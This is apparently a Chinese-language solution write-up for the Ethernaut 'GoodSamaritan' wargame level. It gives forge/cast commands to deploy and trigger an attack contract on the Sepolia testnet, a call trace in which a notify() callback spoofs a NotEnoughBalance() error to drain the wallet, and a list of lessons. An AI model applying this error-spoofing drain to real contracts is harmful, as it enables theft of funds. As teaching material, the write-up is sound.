# 28-GoodSamaritan
```
# 1. 部署攻击合约
forge create src/28-GoodSamaritan/GoodSamaritanAttack.sol:GoodSamaritanAttack \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY \
    --broadcast \
    --constructor-args $GoodSamaritan_ADDRESS
export GoodSamaritan_ADDRESS=0xEfEb3CC9FF84ccf0D376348A216794072d75AB18
Deployed to: 0xfeE3DE6909322e4A0B20E501b9aa4762Eb08F4bf
export ATTACK_ADDRESS=0xfeE3DE6909322e4A0B20E501b9aa4762Eb08F4bf

# 2. 查看初始余额（可选）
cast call $GoodSamaritan_ADDRESS "coin()(address)" --rpc-url $sepolia_rpc
export COIN_ADDRESS=0x5071E32Bb12387f74909C703B247f07F373A016C
cast call $COIN_ADDRESS "balances(address)(uint256)" $YOUR_ADDRESS --rpc-url $sepolia_rpc
# 应该是 0

# 3. 执行攻击
cast send $ATTACK_ADDRESS "attack()" \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY

# 4. 验证攻击成功
cast call $COIN_ADDRESS "balances(address)(uint256)" $YOUR_ADDRESS --rpc-url $sepolia_rpc
# 应该显示 1000000 (10^6)

# 执行链路
attacker.attack()
  → GoodSamaritan.requestDonation()
    → wallet.donate10(attacker)
      → coin.transfer(attacker, 10)
        → attacker.notify(10)  ← 攻击者检测到 amount == 10
          → revert NotEnoughBalance()  ← 伪造错误！
    → catch NotEnoughBalance()  ← GoodSamaritan 误以为余额不足
      → wallet.transferRemainder(attacker)
        → coin.transfer(attacker, 1000000)  ← 转移全部余额
          → attacker.notify(1000000)  ← 正常接收，不抛错
```

### 考察点
- **自定义错误伪造**：任何合约都可以抛出相同签名的 `NotEnoughBalance()` 错误
- **错误处理缺陷**：只检查错误签名，不验证错误来源和真实状态
- **回调函数风险**：`notify()` 回调给攻击者控制执行流的机会
- **业务逻辑漏洞**：小额失败 → 转移全部余额的设计不合理
